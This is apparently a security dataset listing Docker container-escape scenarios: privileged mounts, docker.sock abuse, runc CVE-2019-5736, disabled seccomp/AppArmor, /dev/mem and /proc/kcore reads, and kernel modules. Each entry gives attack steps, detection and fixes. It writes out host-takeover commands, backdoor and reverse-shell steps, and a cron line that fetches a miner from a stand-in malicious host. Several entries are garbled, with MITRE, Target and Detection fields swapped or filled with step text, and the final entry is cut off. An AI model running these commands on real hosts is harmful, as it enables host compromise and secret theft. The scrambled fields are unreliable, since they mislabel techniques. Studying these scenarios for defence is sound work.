# Virtualization & Container Security → Defensive Evasion & Persistence → 🛡️ Evading Container Security Tools Attacks

## Privileged Container with Host Mount Enables Full Host Compromise

- **Attack Type**: Privileged Container Abuse
- **Target**: Linux Docker Host
- **Vulnerability**: Use of --privileged + host volume mount
- **MITRE**: T1611
- **Impact**: Full host takeover from container
- **Tools**: Docker CLI, Bash, Netcat
- **Scenario**: A container is launched with --privileged and host directory (/) mounted, allowing an attacker to overwrite host binaries and escape to the host system
- **Attack Steps**: 1. Attacker gains access to a Docker host (e.g., through weak SSH credentials or CI/CD exploit).2. They start a new container using the following command:docker run --rm -it --privileged -v /:/host ubuntu bash3. Inside the container, they chroot into the host system:chroot /host4. Attacker now has root access to the host filesystem from within the container.5. They modify /etc/shadow or add a backdoor in /etc/rc.local.6. A reverse shell is launched from the host.7. Detection is hard without strict logging of container launches.8. Forensics are difficult as changes are made directly on host.9. Privileged containers with root host mount effectively become root on host.10. This scenario shows why --privileged should never be used in production unless absolutely necessary.
- **Detection**: Docker daemon logs (if enabled), Sysmon for Linux
- **Solution**: Disallow privileged containers via daemon config
- **Tags**: #dockerescape #privileged #rootaccess

## Docker Socket Abuse via Mounted /var/run/docker.sock

- **Attack Type**: Docker Socket Injection
- **Target**: Container Runtime
- **Vulnerability**: Docker socket exposed to containers
- **MITRE**: T1611
- **Impact**: Host control from within a container
- **Tools**: Docker CLI, Curl, Alpine
- **Scenario**: Container is launched with access to Docker socket, allowing full control of Docker engine from inside the container
- **Attack Steps**: 1. Developer unknowingly mounts Docker socket inside a container:-v /var/run/docker.sock:/var/run/docker.sock2. Attacker inside the container installs Docker CLI tools (e.g., apk add docker-cli).3. They list containers, inspect volumes, and spin up new privileged containers from inside:docker run -it --privileged -v /:/mnt ubuntu chroot /mnt4. They achieve host access through a new container, effectively escalating privileges.5. No authentication protects the socket—it's root access by default.6. Many DevOps tools mount the socket for automation, unaware of this risk.7. Attackers can also copy secrets from other containers or volumes.8. Defense requires understanding that the Docker socket is like root SSH access to the Docker host.9. Reverse shells or mining containers can also be launched via the socket.10. This attack highlights why the socket must never be exposed or shared with untrusted containers.
- **Detection**: Audit mounts, monitor container events
- **Solution**: Replace with Docker API proxy or rootless mode
- **Tags**: #dockersocket #privilegeescalation #cicd

## Exploiting runc CVE-2019-5736` for Container Escape

- **Attack Type**: CVE-Based Escape (Namespace)
- **Target**: Docker Runtime
- **Vulnerability**: CVE-2019-5736 (runc overwrite)
- **MITRE**: T1611
- **Impact**: Complete container breakout to host
- **Tools**: Exploit Code, Docker CLI, BusyBox
- **Scenario**: An attacker overwrites the runc binary used by Docker to escape to the host and run code as root
- **Attack Steps**: 1. Attacker gains shell in a vulnerable container (running unpatched runc).2. They copy a malicious binary to /proc/self/exe via an open file descriptor.3. This overwrites the runc binary on the host, which is used to manage containers.4. Once overwritten, the attacker waits for another container to start (triggering runc).5. The new container execution runs their malicious binary as root on the host.6. Exploit is stealthy and works even in non-privileged containers.7. Detection is very difficult without syscall monitoring.8. Attackers can implant persistent backdoors or reverse shells.9. The fix involves patching runc to reject such file descriptor manipulation.10. This attack proves how a single CVE in runtime tooling can break container isolation entirely.
- **Detection**: Syscall tracing, auditd logs
- **Solution**: Patch runc, apply AppArmor/SELinux profiles
- **Tags**: #cve20195736 #runc #containerescape

## Disabling AppArmor Profiles Allows Dangerous Syscalls

- **Attack Type**: AppArmor / Seccomp Bypass
- **Target**: Container Runtime
- **Vulnerability**: Disabled syscall restrictions
- **MITRE**: T1609
- **Impact**: Kernel-level attack surface from container
- **Tools**: Docker CLI, strace, Syscalls
- **Scenario**: Containers launched without AppArmor or Seccomp profiles can perform unsafe syscalls like ptrace, mknod, or mount
- **Attack Steps**: 1. Security team forgets to apply AppArmor and Seccomp profiles on a container.2. Attacker runs container with:docker run --security-opt seccomp=unconfined --security-opt apparmor=unconfined3. Inside container, attacker uses ptrace to snoop on other processes.4. They create custom device nodes using mknod or mount file systems.5. This allows them to create pseudo-terminals or map host memory.6. These capabilities are normally blocked by Seccomp filters.7. Without profiles, container becomes nearly equivalent to host.8. Syscall auditing is required to detect abnormal patterns.9. Default Docker installs often have weak or no profiles.10. Every container should be launched with a strict Seccomp + AppArmor profile combination.
- **Detection**: Sysdig, auditd, Falco
- **Solution**: Apply least-privilege syscall profiles
- **Tags**: #seccomp #apparmor #linuxhardening

## CI/CD Build Container with Hardcoded Secrets Compromised Post-Push

- **Attack Type**: CI/CD Misconfiguration
- **Target**: CI/CD Build Container
- **Vulnerability**: Secrets stored in image layers
- **MITRE**: T1552
- **Impact**: Credential leakage in public images
- **Tools**: Docker, GitHub Actions, DockerHub
- **Scenario**: Dockerfile used in CI contains sensitive environment variables that get exposed in built image layers
- **Attack Steps**: 1. Developer writes a Dockerfile with lines like:ENV AWS_SECRET=AKIAxxx2. Image is built and pushed to DockerHub as part of CI.3. Secrets are now embedded in intermediate layers of the image.4. A malicious user pulls the image and inspects with docker history or docker inspect.5. Secrets are fully visible in plaintext.6. Red Team demonstrates how secrets can be used to pivot into AWS account.7. DevSecOps team disables ENV-based secrets in builds.8. Vault-injected secrets at runtime are used instead (e.g., AWS Secrets Manager).9. CI pipeline is refactored to scrub secrets from build logs and image history.10. Static analysis tools like TruffleHog or Gitleaks are used in CI to prevent recurrence.
- **Detection**: Image layer inspection, GitLeaks
- **Solution**: Inject secrets at runtime via vaults
- **Tags**: #cicd #secretsmanagement #dockerbuild

## Malicious Base Image Introduces Crypto Miner in Production

- **Attack Type**: Insecure Image Source
- **Target**: bash`4. After deployment, servers experience high CPU usage.5. Red Team identifies outbound traffic to mining pool domains.6. Reverse engineering the image reveals malicious layer.7. DevSecOps implements image provenance verification via digests (not tags).8. Trusted registries and signing (Docker Content Trust) are enforced.9. Image scanning tools like Grype are used before deployment.10. All future base images are pinned to verified SHA digests.
- **Vulnerability**: Docker Base Image
- **MITRE**: Pulling from unverified sources
- **Impact**: T1584.005
- **Tools**: DockerHub, Cron, Alpine
- **Scenario**: Dev team uses unverified public base image that contains hidden cronjob mining cryptocurrency
- **Attack Steps**: 1. Developer writes Dockerfile like:FROM alpine:latest2. They unknowingly pull from a malicious user account that named their image similarly.3. Inside the image is a cron job that runs a miner every hour:`*/60 * * * * curl http://malicious.com/miner
- **Detection**: Resource abuse and reputational damage
- **Solution**: CPU metrics, egress monitoring
- **Tags**: Pin trusted image digests; scan on pull

## Docker Daemon Bound to Public TCP Port Without TLS

- **Attack Type**: Remote Daemon Exposure
- **Target**: Docker Daemon
- **Vulnerability**: Insecure remote Docker port open
- **MITRE**: T1071.001
- **Impact**: Unauthenticated full root access
- **Tools**: Nmap, Metasploit, Docker CLI
- **Scenario**: Docker is exposed at tcp://0.0.0.0:2375, allowing remote root access to anyone on the internet
- **Attack Steps**: 1. Sysadmin configures Docker to listen on TCP for remote control:dockerd -H tcp://0.0.0.0:23752. They forget to secure it with TLS or firewall rules.3. Attacker finds the port exposed via Shodan or masscan.4. They connect remotely using Docker CLI:docker -H tcp://victim-ip:2375 ps5. They launch a new container with privileged mode and mount /.6. Host compromise is complete.7. Red Team uses this to demonstrate lateral movement from Dev to Prod.8. DevSecOps disables TCP socket and configures secure remote access using TLS certs.9. UFW firewall is used to restrict access to localhost.10. Regular scans are scheduled to detect exposed Docker APIs.
- **Detection**: Nmap, netstat, Shodan
- **Solution**: Disable TCP socket or use TLS+auth
- **Tags**: #dockerd #insecureapi #2375exposed

## Capabilities Abuse: SYS_ADMIN Escalates Container to Host-Like Access

- **Attack Type**: Linux Capability Abuse
- **Target**: Linux Kernel via Container
- **Vulnerability**: Overuse of dangerous capabilities
- **MITRE**: T1609
- **Impact**: Host-level privilege from container
- **Tools**: Docker CLI, capsh, Kernel Tools
- **Scenario**: Container is granted SYS_ADMIN capability, allowing it to perform mount operations and access kernel features
- **Attack Steps**: 1. Developer launches container with excessive capabilities:--cap-add=SYS_ADMIN2. This is often done for troubleshooting or debugging without understanding implications.3. Attacker uses this capability to mount the host filesystem using loop devices.4. Tools like mount, losetup, and pivot_root are used to escape to host namespace.5. From there, attacker reads sensitive files and possibly implants malware.6. SYS_ADMIN is the most powerful capability—equal to root on host.7. DevSecOps team audits all uses of --cap-add and restricts to least privilege.8. Containers are reviewed for unnecessary privilege use.9. Security context policies are implemented in orchestrators like Kubernetes.10. Scanning tools like dockle or kube-hunter are used to detect excessive capabilities.
- **Detection**: Docker inspect, runtime audits
- **Solution**: Drop all caps by default, allow per-need
- **Tags**: #capabilities #sysadmin #containerrisk

## Mounted /etc Volume Modified from Container

- **Attack Type**: Host File Manipulation
- **Target**: Host Configuration
- **Vulnerability**: Writable access to /etc from container
- **MITRE**: T1574.007
- **Impact**: Persistence and config tampering
- **Tools**: Docker CLI, Bash
- **Scenario**: A container is granted write access to host /etc, allowing attacker to change configuration, add users, or inject startup scripts
- **Attack Steps**: 1. Admin mounts host /etc directory inside container:-v /etc:/mnt/etc2. Attacker inside container edits /mnt/etc/shadow to reset root password.3. They modify /mnt/etc/rc.local to include a reverse shell.4. Upon next reboot, attacker regains access.5. Red Team uses this to simulate persistence via host files.6. DevSecOps bans mounting sensitive directories from host.7. Audit of volume mounts across CI and staging environments is performed.8. Mount whitelisting is enforced per container role.9. Runtime monitoring is used to alert on suspicious host file changes.10. Developers are trained to use bind mounts cautiously.
- **Detection**: File integrity monitoring
- **Solution**: Prevent host config mounts to containers
- **Tags**: #volumemount #persistence #hosttamper

## Logging Blindspot in Docker Host Allows Undetected Abuse

- **Attack Type**: Logging & Monitoring Gap
- **Target**: Docker Host
- **Vulnerability**: Incomplete or short-lived logging
- **MITRE**: T1005
- **Impact**: Stealthy container abuse without audit
- **Tools**: Docker Daemon, journald, Falco
- **Scenario**: Container abuse goes unnoticed due to missing audit logs and disabled Docker daemon logging
- **Attack Steps**: 1. Docker is running on host with default logging (JSON file driver).2. Logs are not forwarded to centralized SIEM or retained long enough.3. Attacker runs multiple suspicious containers:docker run -d --name miner hidden/miner4. They destroy containers after use; logs are wiped due to short retention.5. No syscall or file integrity monitoring exists.6. Red Team demonstrates undetected resource usage, lateral scans.7. DevSecOps team enables journald + Docker syslog integration.8. All container logs are shipped to SIEM with retention.9. Falco is deployed to monitor syscall-level behavior.10. Auditd rules are created for Docker binary and config files.
- **Detection**: Syslog, journald, Falco events
- **Solution**: Centralize logging and enable syscall monitors
- **Tags**: #dockerlogs #falco #audit

## Privileged Container Abuse to Access Host Filesystem

- **Attack Type**: Privileged Container Abuse
- **Target**: Host OS via Docker
- **Vulnerability**: Misuse of --privileged and volume mount
- **MITRE**: T1611
- **Impact**: Full host compromise via container
- **Tools**: Docker CLI, Bash
- **Scenario**: Attacker abuses --privileged flag to mount host root (/) and modify system files
- **Attack Steps**: 1. Red Teamer creates a Docker container with the --privileged flag, which removes nearly all container restrictions and gives full device access.2. They also mount the host's root filesystem using -v /:/mnt.3. Inside the container, they navigate to /mnt and now have full access to the host filesystem.4. The attacker modifies /mnt/etc/shadow to inject a new root password hash or creates a backdoor user in /mnt/home/.5. They may replace /mnt/root/.ssh/authorized_keys to allow persistent SSH access.6. This effectively turns the container into a host root shell.7. Most monitoring tools won’t trigger alarms as this happens within a "containerized" context.8. Blue Team discovers this only if auditing file changes or monitoring Docker API commands.9. Red Team presents this during assessment to show the risk of exposing --privileged to untrusted users or CI jobs.10. Solution includes never using --privileged, and replacing it with fine-grained cap-add as needed.
- **Detection**: Docker API auditing, file integrity monitoring
- **Solution**: Disable --privileged; enforce seccomp, AppArmor, and use specific cap-add only
- **Tags**: #dockerescape #privileged #hostaccess

## Full Host Takeover via Mounted Docker Socket

- **Attack Type**: Docker.sock Abuse
- **Target**: Docker Host
- **Vulnerability**: Mounted Docker socket grants full access
- **MITRE**: T1611
- **Impact**: Full root access to host system
- **Tools**: Docker CLI, Bash
- **Scenario**: Attacker mounts /var/run/docker.sock inside a container to control Docker daemon and launch host-level containers
- **Attack Steps**: 1. Red Teamer runs a container with the host's Docker socket mounted: -v /var/run/docker.sock:/var/run/docker.sock.2. From inside the container, they install Docker CLI or use pre-installed client.3. They then run docker ps to verify control of host Docker daemon.4. Next, they launch a new container from inside the first container, but this time with elevated flags:docker run -v /:/mnt --privileged -it alpine chroot /mnt5. This grants root-level access to the host filesystem.6. Now attacker can modify system files, install persistence tools, or scrape secrets from host.7. This kind of escape bypasses seccomp, AppArmor, and most host-level monitoring if logs are not collected.8. Developers often mount docker.sock for convenience in CI/CD — this turns into a critical vulnerability.9. Red Team uses this to demonstrate that socket access equals full host access.10. Blue Team remediates by banning docker.sock exposure and replacing with tightly scoped container APIs or remote build agents.
- **Detection**: Audit Docker socket access; container runtime logging
- **Solution**: Avoid mounting Docker socket; use container build proxies
- **Tags**: #dockersock #containerecape #dockerabuse

## CVE-2019-5736 runc Exploit to Escape Container

- **Attack Type**: Namespace Escape (runc)
- **Target**: Host via Container
- **Vulnerability**: runc stdin overwrite vulnerability
- **MITRE**: T1609
- **Impact**: Root command execution on host
- **Tools**: Exploit code, gcc, Bash
- **Scenario**: Exploits CVE-2019-5736 in runc to overwrite host binaries and escape container to host
- **Attack Steps**: 1. Red Teamer uses a Docker base image vulnerable to CVE-2019-5736 (older runc versions).2. Inside the container, they compile a malicious binary that overwrites /bin/sh or /bin/bash on the host.3. This is possible because runc processes stdin/stdout with elevated privileges.4. Exploit overwrites the runc binary used by the host.5. When the next container is launched on host, the malicious binary runs with root privileges outside container context.6. The exploit provides a root shell or executes a script with host access.7. This requires no --privileged flag or volume mounts, making it extremely stealthy.8. Blue Team rarely detects this unless integrity checks or runtime protections exist.9. Red Team uses this to show how patching base runtimes is critical.10. Solution: update runc to patched version (runc >= 1.0.0-rc6) and use AppArmor or SELinux to reduce exposure.
- **Detection**: File integrity monitoring, runc version checks
- **Solution**: Upgrade runc, use seccomp and read-only FS
- **Tags**: #runc #cve20195736 #namespaceescape

## Seccomp Disabled to Enable Dangerous Syscalls

- **Attack Type**: Seccomp Bypass
- **Target**: Kernel via Container
- **Vulnerability**: No syscall filtering (seccomp off)
- **MITRE**: T1548.004
- **Impact**: Syscall-based container escape attempt
- **Tools**: Docker CLI, Sysdig
- **Scenario**: Running containers without seccomp lets attacker invoke syscalls like ptrace, mknod, enabling deeper host interaction
- **Attack Steps**: 1. Attacker runs a container with --security-opt seccomp=unconfined, disabling syscall filtering.2. From inside container, they use ptrace to attempt process tracing of host processes if PID namespace is shared.3. They may also create devices using mknod, e.g., custom /dev/kmsg to write to kernel log.4. These capabilities allow reading host memory or interacting with hardware, depending on container privileges.5. Without seccomp, attacker bypasses one of the strongest Docker defense mechanisms.6. Logs may show no anomaly as behavior is "valid" from container’s view.7. Blue Team only detects if syscall auditing (e.g., via eBPF or auditd) is in place.8. DevSecOps adds mandatory seccomp profiles per workload to restrict syscall usage.9. Red Team uses this as a teaching example for bypassing syscall restrictions.10. Always run containers with default or custom-restricted seccomp profiles.
- **Detection**: Syscall audit logs, eBPF, Falco
- **Solution**: Enforce seccomp profiles with denylist
- **Tags**: #seccomp #syscalls #containerrisk

## AppArmor Disabled to Allow Arbitrary Kernel Access

- **Attack Type**: AppArmor Bypass
- **Target**: Host Kernel
- **Vulnerability**: Missing AppArmor enforcement
- **MITRE**: T1611
- **Impact**: Full kernel attack surface exposed
- **Tools**: Docker, AppArmor, Bash
- **Scenario**: Container launched without AppArmor profile can perform unrestricted operations on the host kernel
- **Attack Steps**: 1. Attacker launches container with --security-opt apparmor=unconfined.2. This disables AppArmor confinement, allowing access to kernel resources like /proc, /sys, and host devices if mounted.3. Inside container, attacker uses tools like nmap, strace, or custom C code to interact with system memory, process tables, or load kernel modules.4. These operations are normally blocked by AppArmor profiles like docker-default.5. Blue Team monitoring tools see container as “normal” unless enforced audit is enabled.6. The attacker may dump memory or interfere with host I/O subsystems.7. DevSecOps mistakenly assumed containerization was secure by default.8. Red Team shows how removing AppArmor disables one of the only syscall filters on Ubuntu/Debian-based systems.9. Countermeasure includes enforcing docker-default or per-image AppArmor policies.10. Monitoring tools like AppArmor audit or Falco should alert on unconfined launches.
- **Detection**: AppArmor audit logs, process behavior
- **Solution**: Enforce AppArmor profiles; no unconfined launches
- **Tags**: #apparmor #containerrisks #dockerbypass

## Host Escape via Custom Kernel Module from Privileged Container

- **Attack Type**: Privileged Container + Kernel Injection
- **Target**: Host Kernel
- **Vulnerability**: Kernel module injection via --privileged
- **MITRE**: T1611
- **Impact**: Rootkit installation, total host takeover
- **Tools**: make, insmod, gcc, Docker CLI
- **Scenario**: A privileged container is used to compile and insert a kernel module into the host kernel, escaping the container boundary
- **Attack Steps**: 1. Attacker spins up a Docker container using --privileged and mounts /lib/modules and /boot from host into the container.2. They write or copy a malicious .ko kernel module source code into the container that, when loaded, opens a reverse shell or modifies kernel behavior.3. Using tools inside the container (gcc, make), they compile the .ko module against the host kernel headers.4. They then run insmod evil.ko, and the kernel module is loaded into the host kernel from within the container.5. The module executes arbitrary code in kernel space, such as installing a rootkit, hiding processes, or listening on host interfaces.6. Blue Team won’t detect this if kernel audit logs or module insertion alerts are not configured.7. This shows how --privileged grants not just device access but kernel-level compromise.8. The Red Team demonstrates this in scenarios where CI/CD pipelines spawn containers with full privileges.9. Blue Team remediates by enforcing container runtime security (AppArmor, SELinux) and denying kernel module insertion from containers.10. Additional defense includes disabling module loading at runtime via kernel.modules_disabled=1 in sysctl.
- **Detection**: Kernel audit logs (if enabled), Falco module load alerts
- **Solution**: Disable module insertion; avoid --privileged containers
- **Tags**: #kernelmodule #privilegeescape #dockersecurity

## Privileged Container with /dev/mem Access for Host Memory Dump

- **Attack Type**: Privileged Container Abuse
- **Target**: strings
- **Vulnerability**: grep passwordto dump and scan host memory for plaintext secrets.<br>4. This can expose sensitive info like SSH keys, AWS tokens, password hashes, etc., especially if host memory is not encrypted or secured.<br>5. This bypasses most container escape detection tools because the interaction is “legal” due to--privileged.<br>6. The container operates like a host process with direct access to memory mapped devices.<br>7. Blue Team might miss this unless /dev/memaccess is explicitly monitored or denied.<br>8. DevSecOps teams often expose/devfor debugging without realizing implications.<br>9. Hardening measures include using cgroups, AppArmor, and avoiding mounting/dev/mem` at all.10. Red Team uses this to demonstrate that even read-only mounts can leak vast amounts of sensitive info.
- **MITRE**: Host Memory
- **Impact**: Direct access to /dev/mem via device mount
- **Tools**: Docker, hexdump, Bash
- **Scenario**: Container accesses /dev/mem to read raw host memory, leaking sensitive credentials or secrets
- **Attack Steps**: 1. Red Teamer starts a container with --privileged and mounts /dev/mem from host using -v /dev/mem:/dev/mem.2. Inside the container, they install basic utilities like hexdump, dd, or strings.3. They execute `dd if=/dev/mem bs=1M count=100
- **Detection**: T1003.001
- **Solution**: Memory exfiltration of sensitive host secrets
- **Tags**: Device audit logs, host memory access monitors

## Reverse Shell via /proc/kcore Access in Privileged Container

- **Attack Type**: Kernel Dump Access
- **Target**: Kernel Memory
- **Vulnerability**: Exposure of /proc/kcore to containers
- **MITRE**: T1003.004
- **Impact**: Kernel memory leak, reverse shell execution
- **Tools**: Docker, gdb, strings, netcat
- **Scenario**: Attacker accesses /proc/kcore to inspect kernel memory and extract secrets, leading to code injection or reverse shell
- **Attack Steps**: 1. Attacker launches a privileged container and mounts /proc from the host using -v /proc:/mnt/proc.2. From inside the container, they access /mnt/proc/kcore, which is a memory-mapped representation of the kernel's address space.3. Using tools like gdb, strings, or dd, they extract secrets such as kernel base address, SSH keys, AWS tokens, etc.4. They create a malicious reverse shell binary and attempt to inject it into kernel space using syscall manipulation or shared memory.5. They initiate a netcat listener outside and use the reverse shell to escape the container entirely.6. This technique exploits both the availability of /proc/kcore and the lack of AppArmor/SELinux confinement.7. Blue Team typically doesn’t monitor kernel memory access unless custom alerts are configured.8. The Red Team recommends denying access to /proc/kcore in runtime profiles.9. Developers must ensure --privileged containers cannot access critical pseudo-filesystems like /proc from the host.10. Host should be hardened to disable kcore or limit container namespace exposure.
- **Detection**: Syscall monitoring, kernel memory access logs
- **Solution**: Disable kcore access via sysctl, AppArmor deny rules
- **Tags**: #kcore #memoryleak #dockerescape

## Abuse of Docker-in-Docker with --privileged to Escape Host

- **Attack Type**: Docker-in-Docker Abuse
- **Target**: Host Docker Daemon
- **Vulnerability**: Misuse of Docker-in-Docker with elevated rights
- **MITRE**: T1611
- **Impact**: Full host takeover via nested Docker instance
- **Tools**: Docker, Docker-in-Docker image
- **Scenario**: Nested Docker engine (dind) runs inside container and is used to create privileged containers on host
- **Attack Steps**: 1. DevOps team configures Docker-in-Docker (dind) image in a CI/CD pipeline for building container images.2. Attacker gets access to this container (via SSRF, exposed port, or compromised runner).3. Inside the dind container, they execute docker run --privileged -v /:/mnt alpine chroot /mnt to spawn a new container on the host.4. Since the inner Docker daemon is connected to the host Docker daemon via socket mount, the attacker achieves host-level control.5. From the spawned container, they access the host filesystem, modify system binaries, or extract secrets.6. This technique leverages "nesting" to confuse monitoring tools.7. Most security solutions treat the inner container as isolated, missing the breakout.8. Blue Team is unaware unless Docker socket activity is monitored.9. The Red Team advises replacing Docker-in-Docker with buildkitd or remote builders.10. Avoid using --privileged or socket mounts in nested container setups.
- **Detection**: Docker API logs, build logs
- **Solution**: Replace dind with rootless or remote builders
- **Tags**: #dind #containernesting #dockerescape

## Escalation via Host PID Namespace from Container

- **Attack Type**: Namespace Abuse
- **Target**: Host Processes
- **Vulnerability**: Shared PID namespace with host
- **MITRE**: T1611
- **Impact**: View and control of host processes
- **Tools**: Docker, nsenter, ps, strace
- **Scenario**: Attacker joins host PID namespace from container and inspects/modifies host processes
- **Attack Steps**: 1. Red Teamer runs a container with --pid=host flag to share the host’s process namespace.2. Inside the container, they now have visibility into host processes (ps aux shows everything).3. Using tools like strace, gdb, or kill, they begin analyzing host processes for injected credentials or debugging symbols.4. They identify vulnerable services and may inject into memory or create rogue threads.5. If container is also privileged or mounts /proc, they have the ability to read environment variables, files, or send signals to host processes.6. Blue Team detection is minimal unless kernel-level tracing or Falco is deployed.7. This attack bypasses many container isolation assumptions because PID namespace is shared.8. Red Team uses this to demonstrate how seemingly “isolated” containers can actually see and affect the host.9. Countermeasure includes never using --pid=host unless required and tightly scoped.10. Use AppArmor to prevent nsenter or restrict capabilities in runtime.
- **Detection**: Falco rule on host PID access, auditd
- **Solution**: Disallow --pid=host usage in untrusted containers
- **Tags**: #pidnamespace #containervulnerability

## Breakout via Host Network Stack Access

- **Attack Type**: --network=host Misuse
- **Target**: Host Network
- **Vulnerability**: Misuse of --network=host
- **MITRE**: T1040
- **Impact**: Traffic eavesdropping, lateral discovery
- **Tools**: Docker CLI, tcpdump, netcat
- **Scenario**: Attacker abuses containers running with --network=host to sniff or interfere with host traffic
- **Attack Steps**: 1. Red Teamer starts a container using --network=host to share the host’s network namespace.2. Inside the container, they use tcpdump to monitor all traffic on eth0, including DNS, HTTP, and internal service-to-service communications.3. They identify sensitive API calls, secrets in transit, or internal endpoints.4. Using netcat, attacker mimics internal services or performs DNS spoofing.5. If container also has write privileges or host routing exposed, it may manipulate routing tables or inject packets.6. This effectively transforms the container into a stealth MITM proxy.7. Blue Team is unaware if network namespace isolation isn't enforced or logs aren't reviewed.8. The attack bypasses most network isolation assumptions in container workloads.9. Red Team demonstrates that --network=host violates container network segmentation principles.10. Defense includes disallowing host network mode and implementing eBPF-based network tracing for anomaly detection.
- **Detection**: Packet captures, eBPF filters, netstat comparison
- **Solution**: Disallow --network=host, enforce per-container vNICs
- **Tags**: #dockerescape #hostnetwork #networkisolation

## Hijacking Docker Daemon via Systemd Socket Activation

- **Attack Type**: Socket Abuse
- **Target**: Docker Daemon
- **Vulnerability**: Insecure Docker socket access via systemd
- **MITRE**: T1611
- **Impact**: Container breakout via Docker API
- **Tools**: systemctl, socat, docker
- **Scenario**: Abusing systemd-controlled Docker daemon socket to escalate from user container to host
- **Attack Steps**: 1. Attacker compromises a container with access to systemd socket or docker.service exposed to user groups (e.g., in misconfigured self-hosted runners).2. They scan for active UNIX domain sockets in /run/docker.sock, /var/run/ etc.3. Using socat or direct socket calls, they send raw HTTP requests to control the Docker daemon.4. They invoke docker run --privileged via socket to spin up an escape container.5. The new container mounts / and executes host commands or shells.6. Red Team leverages weak systemd socket permissions or poorly scoped runners.7. Blue Team lacks visibility unless auditd is configured to watch socket activity.8. DevSecOps often forget to secure socket permissions during CI/CD service deployment.9. Defense: restrict docker.sock to root, disallow socket exposure to non-admin groups.10. Enforce AppArmor profiles to restrict container actions regardless of socket access.
- **Detection**: auditd syscall logs, systemd journal entries
- **Solution**: Lock down docker group and socket access rights
- **Tags**: #dockerdaemon #systemd #dockerapiabuse

## Abuse of Shared Mount Propagation to Alter Host

- **Attack Type**: Mount Propagation Misuse
- **Target**: Host Filesystem
- **Vulnerability**: Mount propagation set to shared
- **MITRE**: T1203
- **Impact**: Host file system modification via container
- **Tools**: Docker, Bash
- **Scenario**: Exploit containers with shared mounts to propagate filesystem changes back to host
- **Attack Steps**: 1. Red Teamer runs a container with shared mount propagation enabled using --mount type=bind,source=/data,target=/mnt,bind-propagation=shared.2. Inside the container, they mount a malicious filesystem to /mnt/malicious.3. Due to shared propagation, this mount event propagates to the host.4. Attacker creates or modifies critical files like authorized_keys, startup scripts, etc., under /mnt/malicious.5. These changes reflect on host, potentially allowing attacker persistence or escalation.6. Developers typically misconfigure mount propagation for logging or volume syncing.7. Red Team exploits this oversight to perform stealthy file system-level attacks.8. Blue Team usually misses this unless bind-mounts are monitored.9. Countermeasure: use rprivate instead of shared in all bind mounts.10. Audit container startup flags in CI/CD to block improper propagation settings.
- **Detection**: Runtime container inspection, mount flags audit
- **Solution**: Use rprivate bind mounts, block shared propagation
- **Tags**: #mountpropagation #dockerescape #bindmounts

## Exploiting Host IPC Namespace via --ipc=host

- **Attack Type**: IPC Namespace Abuse
- **Target**: Shared Memory / IPC
- **Vulnerability**: Host IPC exposure via container flag
- **MITRE**: T1056.001
- **Impact**: Sensitive data extraction from IPC
- **Tools**: ipcs, strace, Docker CLI
- **Scenario**: Attacker reads or interferes with shared memory segments or semaphores from the host
- **Attack Steps**: 1. Attacker starts a container with --ipc=host, giving access to host’s Inter-Process Communication (IPC) namespace.2. Inside container, they list all shared memory and semaphores via ipcs.3. They attach to shared memory segments used by sensitive host processes (e.g., Redis, PostgreSQL, Java apps).4. Using strace and memory inspection tools, they observe or manipulate communication between host services.5. They extract plaintext data (passwords, session tokens) exchanged between trusted host components.6. No elevated privileges are required, just namespace sharing.7. Developers often enable --ipc=host for performance reasons.8. Blue Team is blind unless IPC monitoring is configured.9. Red Team demonstrates that shared IPC equals shared secrets.10. Always use isolated IPC namespaces and audit all non-default container options.
- **Detection**: ipcs, strace, AppArmor
- **Solution**: Avoid --ipc=host, restrict container options
- **Tags**: #ipc #dockerabuse #namespaceleak

## Privileged Container Loading Custom Device Tree Blobs

- **Attack Type**: Device Injection via --privileged
- **Target**: Host Kernel / Device Tree
- **Vulnerability**: Full device access via privileged flag
- **MITRE**: T1200
- **Impact**: Kernel abuse, host hardware spoofing
- **Tools**: Docker CLI, losetup, mknod
- **Scenario**: Attacker injects new hardware devices (e.g., loopback, /dev/fuse) into host system
- **Attack Steps**: 1. Red Team launches a container with --privileged and access to /dev/.2. They use mknod to create fake devices or override real ones (e.g., /dev/null, /dev/fuse).3. They mount fake loopback devices using losetup, which may then get interpreted by host processes.4. They manipulate or inject crafted device tree blobs which simulate vulnerable hardware states.5. Blue Team detection is low due to lack of kernel-level integrity checks.6. Red Team demonstrates hardware-level host compromise from inside container.7. Defense: use --device to pass only specific hardware, avoid full device tree exposure.8. Enforce AppArmor denylist for device nodes.9. Monitor mknod syscalls and loop device behavior.10. Ensure containers have no raw access to /dev unless absolutely needed.
- **Detection**: Syscall trace (mknod), dmesg logs
- **Solution**: Use device cgroup policies to isolate containers
- **Tags**: #devicenodes #dockerprivileged #containerrisk

## Gaining Host Root via OverlayFS Overwrite

- **Attack Type**: Filesystem Overlay Abuse
- **Target**: Host File Binaries
- **Vulnerability**: OverlayFS merge overwriting host files
- **MITRE**: T1609
- **Impact**: Persistent backdoor into host executables
- **Tools**: Docker, OverlayFS, Bash
- **Scenario**: OverlayFS used to overwrite or hijack host binaries during build or runtime
- **Attack Steps**: 1. Red Team mounts an OverlayFS volume that maps upper directory (container) over lower directory (host-mapped volume).2. By writing to the upper layer, they overwrite key files from the lower (host) layer — e.g., /bin/sudo, /etc/shadow.3. Host assumes files remain unchanged due to mount layering, but attacker inserts malicious code.4. After container exits, host resumes normal operations — now running tampered binaries.5. This is especially dangerous during CI/CD builds with mount propagation enabled.6. Most detection tools don't inspect OverlayFS behavior inside containers.7. Blue Team is unaware unless overlayfs-specific monitoring is deployed.8. Use build isolation and discardable volumes to prevent overlay corruption.9. Ensure CI/CD doesn't mount host-critical paths with OverlayFS.10. Enforce read-only root FS and immutability of system paths.
- **Detection**: Integrity check of system binaries, container file tracing
- **Solution**: No OverlayFS usage on shared volumes
- **Tags**: #overlayfs #filesystemabuse #dockerescape

## Namespace Escape via Host Kernel /proc/sys Control

- **Attack Type**: Kernel Config Abuse
- **Target**: Host Kernel
- **Vulnerability**: Writable /proc/sys mount to container
- **MITRE**: T1068
- **Impact**: Host kernel config manipulation
- **Tools**: Docker, sysctl, Bash
- **Scenario**: Container modifies host kernel config via mounted /proc/sys and escapes isolation
